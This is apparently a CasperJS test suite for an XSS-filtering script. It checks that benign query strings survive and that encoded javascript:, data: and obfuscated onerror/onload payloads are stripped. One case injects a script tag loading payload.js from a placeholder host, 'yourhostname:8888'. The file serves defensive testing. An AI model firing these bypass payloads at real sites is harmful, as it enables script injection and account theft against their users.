/* global casper: false, location: false */
/* eslint-disable no-script-url*/
'use strict';

var path = 'http://localhost:9000/tmp/samples/xssprotector/xss-tests.html';

var tests = [
    {
        'name': 'Normal data test #1',
        'payload': 'p=1234567890',
        'expected': 'p=1234567890'
    },
    {
        'name': 'Normal data test #2',
        'payload': 'p=aaa&p222222222&=22222222222222',
        'expected': 'p=aaa&p222222222&=22222222222222'
    },
    {
        'name': 'Normal data test #3',
        'payload': 'p=&&&&',
        'expected': 'p=&&&&'
    },
    {
        'name': 'Normal data test #4',
        'payload': 'p=foo&&&&',
        'expected': 'p=foo&&&&'
    },
    {
        'name': 'Normal data test #5',
        'payload': 'p51&p511&p512&p513',
        'expected': 'p51&p511&p512&p513'
    },
    {
        'name': 'Normal data test #6',
        'payload': '=p62&=p621&=p623&=p624',
        'expected': '=p62&=p621&=p623&=p624'
    },
    {
        'name': 'Normal data test #7',
        'payload': 'p73=&p731=&p732=&p733=',
        'expected': 'p73=&p731=&p732=&p733='
    },
    {
        'name': 'Normal data test #8',
        'payload': 'p84=&p841=&p842=&p843=',
        'expected': 'p84=&p841=&p842=&p843='
    },
    {
        'name': 'Normal data test #9',
        'payload': 'p1=aaaa&p2=bbbbb',
        'expected': 'p1=aaaa&p2=bbbbb'
    },
    {
        'name': 'Normal data test #10',
        'payload': 'p1=1&p2=abcdef&p3=()',
        'expected': 'p1=1&p2=abcdef&p3=()'
    },
    {
        'name': 'Normal data test #11',
        'payload': 'p=1&user=ikakavas@testdomain.gr&api-version=2.1&stsRequest=rQIIAbNSzigpKSi20tcvyC8qSczRy09Ly0xO1UvOz9XLL0rPTAGxioS4BMruuVuZ2Fh77Wj-e6KxLMF2FaMaTp36OYl5KZl56XqJxQUVFxgZu5hYDA2MjTcxsfo6-zp5nmCacFbuFpOgf1G6Z0p4sVtqSmpRYklmft4jJt7Q4tQi_7ycypD87NS8Scx8OfnpmXnxxUVp8Wk5-eVAAaDxBYnJJfElmcnZqSW7mFVSU00tTCxTUnRNkpOTdU2Sksx0kwxSzXRTzZMtTC1ME00Mk1MOsGwIucAi8IOFcREr0C-3A6ZLrn182Gt-tWV-vVlpwi5OW-L8Yl-SWJSeWmKrapSWkpqWWJpTAhYGAA2&checkForMicrosoftAccount=false',
        'expected': 'p=1&user=ikakavas@testdomain.gr&api-version=2.1&stsRequest=rQIIAbNSzigpKSi20tcvyC8qSczRy09Ly0xO1UvOz9XLL0rPTAGxioS4BMruuVuZ2Fh77Wj-e6KxLMF2FaMaTp36OYl5KZl56XqJxQUVFxgZu5hYDA2MjTcxsfo6-zp5nmCacFbuFpOgf1G6Z0p4sVtqSmpRYklmft4jJt7Q4tQi_7ycypD87NS8Scx8OfnpmXnxxUVp8Wk5-eVAAaDxBYnJJfElmcnZqSW7mFVSU00tTCxTUnRNkpOTdU2Sksx0kwxSzXRTzZMtTC1ME00Mk1MOsGwIucAi8IOFcREr0C-3A6ZLrn182Gt-tWV-vVlpwi5OW-L8Yl-SWJSeWmKrapSWkpqWWJpTAhYGAA2&checkForMicrosoftAccount=false'
    },
    {
        'name': 'URL-based context test #1',
        'payload': 'p= javascript:alert(1) ',
        'expected': ''
    },
    {
        'name': 'URL-based context test #2',
        'payload': 'p=javascript:alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #3',
        'payload': 'p=javascript&colon;alert(1)',
        'expected': 'p=javascript'
    },
    {
        'name': 'URL-based context test #4',
        'payload': 'p=javascript&#x3A;alert(1)',
        'expected': 'p=javascript&'
    },
    {
        'name': 'URL-based context test #5',
        'payload': 'p=j&#x61;v&#x41;sc&#x52;ipt&#x3A;alert(1)',
        'expected': 'p=j&'
    },
    {
        'name': 'URL-based context test #6',
        'payload': 'p=javascript:',
        'expected': ''
    },
    {
        'name': 'URL-based context test #7',
        'payload': 'p=j&#x61;v&#x41;sc&#x52;ipt&#x3A;al&#x65;rt&lpar;1&rpar;',
        'expected': 'p=j&'
    },
    {
        'name': 'URL-based context test #8',
        'payload': 'p=feed:javascript:alert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #9',
        'payload': 'p=feed:javascript&colon;alert(1)',
        'expected': 'p=feed:javascript'
    },
    {
        'name': 'URL-based context test #10',
        'payload': 'p=feed:data:text/html,%3cscript%3ealert%281%29%3c/script%3e',
        'expected': ''
    },
    {
        'name': 'URL-based context test #11',
        'payload': 'p=feed:data:text/html,%3csvg%20onload=alert%281%29%3e',
        'expected': ''
    },
    {
        'name': 'URL-based context test #12',
        'payload': 'p=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E',
        'expected': ''
    },
    {
        'name': 'URL-based context test #13',
        'payload': 'p=d&#x61;t&#x61;&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': 'p=d&'
    },
    {
        'name': 'URL-based context test #14',
        'payload': 'p=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'expected': ''
    },
    {
        'name': 'URL-based context test #15',
        'payload': 'p=javascript&amp;amp;colon;alert(2)',
        'expected': 'p=javascript'
    },
    {
        'name': 'URL-based context test #16',
        'payload': 'p=javascript:\u0061lert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #17',
        'payload': 'p= javascript%3Aalert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #18',
        'payload': 'p=javascript%3Aalert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #19',
        'payload': 'p=javascript%26colon%3Balert%281%29',
        'expected': ''
    },
    {
        'name': 'URL-based context test #20',
        'payload': 'p=javascript%26%23x3A%3Balert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #21',
        'payload': 'p=j%26%23x61%3Bv%26%23x41%3Bsc%26%23x52%3Bipt%26%23x3A%3Balert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #22',
        'payload': 'p=j%26%23x61%3Bv%26%23x41%3Bsc%26%23x52%3Bipt%26%23x3A%3Bal%26%23x65%3Brt%26lpar%3B1%26rpar%3B',
        'expected': ''
    },
    {
        'name': 'URL-based context test #23',
        'payload': 'p=feed%3Ajavascript%3Aalert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #24',
        'payload': 'p=feed%3Ajavascript%26colon%3Balert(1)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #25',
        'payload': 'p=feed%3Adata%3Atext%2Fhtml%2C%253cscript%253ealert%25281%2529%253c%2Fscript%253e',
        'expected': ''
    },
    {
        'name': 'URL-based context test #26',
        'payload': 'p=feed%3Adata%3Atext%2Fhtml%2C%253csvg%2520onload%3Dalert%25281%2529%253e',
        'expected': ''
    },
    {
        'name': 'URL-based context test #27',
        'payload': 'p=data%3Atext%2Fhtml%2C%253Cscript%253Ealert(1)%253C%2Fscript%253E',
        'expected': ''
    },
    {
        'name': 'URL-based context test #28',
        'payload': 'p=d%26%23x61%3Bt%26%23x61%3B%26colon%3Btext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D',
        'expected': ''
    },
    {
        'name': 'URL-based context test #29',
        'payload': 'p=data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D',
        'expected': ''
    },
    {
        'name': 'URL-based context test #30',
        'payload': 'p=javascript%26amp%3Bamp%3Bcolon%3Balert(2)',
        'expected': ''
    },
    {
        'name': 'URL-based context test #31',
        'payload': 'p=javascript%3A\u0061lert(1)',
        'expected': ''
    },
    {
        'name': 'HTML-context test #1',
        'payload': 'p=<form name="window">',
        'expected': ''
    },
    {
        'name': 'OSX Message XSS',
        'payload': 'fbid=111789595853599&set=a.111055039260388.1073741826.100010676767694&type=3&theater%0A%28function%28s%29%7Bs.src%3D%27http%3A%2f%2fyourhostname%3A8888%2ff%2fpayload.js%27%3Bdocument.body.appendChild%28s%29%7D%29%28document.createElement%28%27script%27%29%29',
        'expected': 'fbid=111789595853599&set=a.111055039260388.1073741826.100010676767694&type=3'
    },
    {
        'name': 'rhainfosec-xss-challenge-2 #1',
        'payload': "p='x'onerror=head['innerHTM'%2B'L']=URL",
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-2 #2',
        'payload': 'p=%27%27onerror=all[0][%27innerH%27%2B%27TML%27]=URL',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-2 #3',
        'payload': 'p=%27%27onerror=all[0][%27innerH%27%2B%27TML%27]=URL#<img src=x onerror=alert(1)>',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-2 #4',
        'payload': 'p=%27x%27%20onerror=v=[onerror%2B%27%27][0];attributes[1].value=%27aler%27%2B%27t%27%2Bv[16]%2B1%2Bv[22];src=2',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-2 #5',
        'payload': 'p=x%20onerror=parentNode[%27innerHT%27%2b%27ML%27]=URL#<img src=x onerror=alert(1)>',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-2 #6',
        'payload': 'p=x%20onerror=%27_=new%20Option;_[%22innerHTM%22%2b%22L%22]=URL%27#<img/src=x onerror=alert(1)>',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-2 #7',
        'payload': 'p=x%20onerror=parentNode[%27innerHT%27%2b%27ML%27]=URL#<img src=x onerror=alert(1)>',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-1 #1',
        'payload': 'p=%3Cbody/onload=this[/l/.source%2b/ocation/.source]=name//',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-1 #2',
        'payload': 'p=%3Csvg/onload=g=parentNode.parentNode.parentNode.parentNode.parentNode.parentNode;h=g[/loc/.source%2b/ation/.source]; g[/loc/.source%2b/ation/.source]=/javascrip/.source%2b/t/.source%2bh[/has/.source%2b/h/.source][1]%2b/aler/.source%2b/t/.source%2bh[/has/.source%2b/h/.source][2]%2b/documen/.source%2b/t./.source%2b/domain/.source%2bh[/has/.source%2b/h/.source][3]%0c#:%28%29',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-1 #3',
        'payload': 'p=%3Csvg/onload=a=[]%2b/trela/;a=a[5]%2ba[4]%2ba[3]%2ba[2]%2ba[1];window.onerror=window[a];throw/1///',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-1 #4',
        'payload': 'p=%3Csvg/onload=s=/source/.source;$=/locatio/[s]%2B/n/[s];_=top[$];top[$]=/javascrip/[s]%2B/t/[s]%2B_[/has/[s]%2B/h/[s]][1]%2B_.pathname//#',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-1 #5',
        'payload': 'p=%3csvg/onload=t=/aler/.source%2b/t/.source;window.onerror=window[t];throw%2b1',
        'expected': ''
    },
    {
        'name': 'rhainfosec-xss-challenge-1 #6',
        'payload': 'p=<marquee/onstart=this[/innerHTM/.source%2B/L/.source]=window[/locatio/.source%2B/n/.source][/has/.source%2B/h/.source];//#<img src=x onerror=alert(document.domain)>',
        'expected': ''
    }
];

casper.test.begin('XSS via query string source tests', tests.length, function suite(test) {
    casper.start();
    tests.forEach(function(t) {
        casper.thenOpen(path + '?' + t.payload, function() {
            test.assertEquals(this.evaluate(function() {
                return location.search.substring(1);
            }), t.expected, t.name);
        });
    });
    casper.run(function() {
        test.done();
    });
});
